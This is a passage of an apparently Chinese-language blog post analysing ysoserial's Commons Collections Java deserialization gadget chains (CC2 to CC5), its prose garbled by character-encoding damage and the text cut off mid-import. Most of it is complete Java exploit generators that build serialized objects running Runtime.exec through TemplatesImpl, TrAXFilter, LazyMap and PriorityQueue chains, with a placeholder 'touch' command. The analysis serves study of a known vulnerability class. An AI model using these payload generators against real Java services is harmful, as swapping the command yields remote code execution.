placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));</span><br><span class="line">        placeholder.makeClassInitializer().insertAfter(<span class="string">"java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");"</span>); <span class="comment">// è¿™é‡Œ insertBefore è¿˜æ˜¯ After éƒ½ä¸€æ ·</span></span><br><span class="line">        placeholder.setName(<span class="string">"demo.rmb122."</span> + System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytecode = placeholder.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(TemplatesImpl).getConstructor(<span class="keyword">new</span> Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field fieldByteCodes = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldByteCodes.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        Field fieldName = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldName.set(templates, <span class="string">"rmb122"</span>);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(invokerTransformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = PriorityQueue.class.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] innerArr = (Object[]) field.get(queue);</span><br><span class="line">        innerArr[<span class="number">0</span>] = templates;</span><br><span class="line">        innerArr[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">        field = PriorityQueue.class.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå­—èŠ‚ç ç”¨çš„æ˜¯ ysoseiral ä¸€æ ·çš„ javassist, å¯ä»¥åœ¨æ­£å¸¸çš„å­—èŠ‚ç å‰åæ’å…¥æ¶æ„ payload.<br>å¦å¤–è¿™é‡Œå› ä¸ºæ˜¯è¿è¡Œçš„å­—èŠ‚ç , æ‰€ä»¥å…¶å®å˜é€šæ–¹æ³•å¾ˆå¤š, å¦‚æœåªæ˜¯æƒ³è¯»å†™æ–‡ä»¶ä½†æœ‰ RASP ban æ‰äº† Runtime.exec, å…¶å®å¯ä»¥é€šè¿‡ File æ¥è¯»å†™æ–‡ä»¶.  </p><p>4 çš„ä¿®å¤æ–¹æ³•æ¯”è¾ƒç²—æš´, ç›´æ¥å¹²æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿.  </p><p><img src="https://i.loli.net/2020/01/27/2aVoPLzdcXFfRj5.png" alt=""></p><h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><p>è¿™ä¸ªä¸ä¸Šé¢çš„ CommonsCollections1 æ¥è¿‘, åŒºåˆ«æ˜¯å°†ä¸€ä¸²çš„ InvokerTransformer æ¢æˆäº† InstantiateTransformer, åˆ©ç”¨åˆšåˆšåœ¨ CommonsCollections2 ä»‹ç»çš„ <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> å¯¼è‡´ RCE. æœ¬è´¨æ˜¯æ¢æ±¤ä¸æ¢è¯.</p><p>InstantiateTransformer åšçš„å·¥ä½œæ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> + (input == <span class="keyword">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯å°†ç±»å®ä¾‹åŒ–, ä¹Ÿå°±æ˜¯è°ƒç”¨ input çš„æ„é€ å‡½æ•°, è¿™é‡Œ InstantiateTransformer èƒ½æ›¿æ¢ InvokerTransformer çš„åŸå› æ˜¯å†…ç½®ç±» <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> åœ¨æ„é€ æ—¶,  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._templates = templates;</span><br><span class="line">    <span class="keyword">this</span>._transformer = (TransformerImpl)templates.newTransformer();</span><br><span class="line">    <span class="keyword">this</span>._transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(<span class="keyword">this</span>._transformer);</span><br><span class="line">    <span class="keyword">this</span>._overrideDefaultParser = <span class="keyword">this</span>._transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šè°ƒç”¨ templates çš„ newTransformer æ–¹æ³•, å…¶å®è¿™é‡Œ InstantiateTransformer èµ·åˆ°çš„ä½œç”¨æ˜¯å’Œ InvokerTransformer ä¸€æ ·çš„.</p><p>exp å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String TrAXFilter = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(CommonsCollections3.Placeholder.class));</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));</span><br><span class="line"></span><br><span class="line">        CtClass placeholder = classPool.get(CommonsCollections3.Placeholder.class.getName());</span><br><span class="line">        placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));</span><br><span class="line">        placeholder.makeClassInitializer().insertAfter(<span class="string">"java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");"</span>);</span><br><span class="line">        placeholder.setName(<span class="string">"demo.rmb122."</span> + System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytecode = placeholder.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(TemplatesImpl).getConstructor(<span class="keyword">new</span> Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field fieldByteCodes = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldByteCodes.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        Field fieldName = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldName.set(templates, <span class="string">"rmb122"</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(TrAXFilter)),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, invo);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Deprecated.class, proxy);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><p>è¿™ä¸ªä¸ä¸Šé¢çš„ CommonsCollections2 æ¥è¿‘, åŒºåˆ«æ˜¯å°† InvokerTransformer æ›¿æ¢ä¸º InstantiateTransformer, æ¢æ±¤ä¸æ¢è¯ + 1, ä¸å†å¤šåšè§£é‡Š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String TrAXFilter = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Placeholder.class));</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));</span><br><span class="line"></span><br><span class="line">        CtClass placeholder = classPool.get(Placeholder.class.getName());</span><br><span class="line">        placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));</span><br><span class="line">        placeholder.makeClassInitializer().insertBefore(<span class="string">"java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");"</span>);</span><br><span class="line">        placeholder.setName(<span class="string">"demo.rmb122."</span> + System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytecode = placeholder.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(TemplatesImpl).getConstructor(<span class="keyword">new</span> Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field fieldByteCodes = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldByteCodes.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        Field fieldName = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldName.set(templates, <span class="string">"rmb122"</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(TrAXFilter)),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chainedTransformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = PriorityQueue.class.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] innerArr = (Object[]) field.get(queue);</span><br><span class="line">        innerArr[<span class="number">0</span>] = templates;</span><br><span class="line">        innerArr[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">        field = PriorityQueue.class.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><p>è¿™ä¸ªä¸æ˜¯æ¢æ±¤ä¸æ¢è¯äº†, ç”¨äº†ä¸€ä¸ªæ–°çš„åˆ©ç”¨é“¾å»è§¦å‘ InvokerTransformer, ä¸è¿‡ ysoserial ä¸Šæ³¨é‡Šé‡Œé¢çš„è°ƒç”¨é“¾æ˜¯é”™è¯¯çš„, ä¼°è®¡æ˜¯å¿˜è®°æ”¹äº†. æ­£ç¡®çš„å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        BadAttributeValueExpException.readObject()</span><br><span class="line">            TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>ä»æ³¨é‡Šé‡Œé¢è¿˜å¯ä»¥å¾—åˆ°, è¿™ä¸ª chain åªèƒ½ç”¨äº &gt;= 8u76, ä¸” SecurityManager æœªè®¾ç½®çš„æƒ…å†µä¸‹ä½¿ç”¨.<br>åŸå› æ˜¯åœ¨ 8u76 çš„æ›´æ–°é‡Œé¢, æ·»åŠ äº† <code>javax.management.BadAttributeValueExpException</code> çš„ readObject æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°, åœ¨ <code>System.getSecurityManager() == null</code> çš„æƒ…å†µä¸‹, å°†ä¼šä¸ç®¡ valObj çš„ç±»å‹, è°ƒç”¨ toString æ–¹æ³•, è¿™é‡Œéœ€è¦é…åˆ <code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> æ¥ä½¿ç”¨, å…¶é‡å†™çš„ toString æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ç†Ÿæ‚‰çš„ map.get äº†ä¹ˆ, è¿™é‡Œå°±åˆå›åˆ°äº† LazyMap çš„é‚£ä¸€å¥—, æ¥ä¸‹æ¥ä¹Ÿä¸ç”¨å¤šè¯´äº†, exp å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 